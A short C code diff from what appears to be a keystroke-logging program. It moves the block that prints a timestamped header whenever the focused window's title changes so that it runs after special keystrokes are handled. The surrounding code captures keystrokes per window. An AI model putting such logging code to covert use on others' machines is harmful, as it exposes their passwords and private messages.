@@ -32,20 +32,6 @@ static void process_event( const struct keystroke_info *info )
     char time_buf[ 22 ];
     const char *out;
 
-    /* notify change of focus with timestamp (use title instead of window id to
-       deal with "tabbed" apps like Chrome) */
-    if ( !current || strcmp( current , info->focused_window_name ) != 0 )
-    {
-        free( current );
-        current = strdup( info->focused_window_name );
-
-        /* format timestamp */
-        strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
-                  localtime( &info->timestamp ) );
-
-        printf( "\n>>> %s : %s\n" , time_buf , info->focused_window_name );
-    }
-
     /* overload some special keystrokes */
     switch ( info->original_keysym )
     {
@@ -90,6 +76,20 @@ static void process_event( const struct keystroke_info *info )
         }
         /* skip */
         else return;
+    }
+
+    /* notify change of focus with timestamp (use title instead of window id to
+       deal with "tabbed" apps like Chrome) */
+    if ( !current || strcmp( current , info->focused_window_name ) != 0 )
+    {
+        free( current );
+        current = strdup( info->focused_window_name );
+
+        /* format timestamp */
+        strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
+                  localtime( &info->timestamp ) );
+
+        printf( "\n>>> %s : %s\n" , time_buf , info->focused_window_name );
     }
 
     printf( "%s" , out );
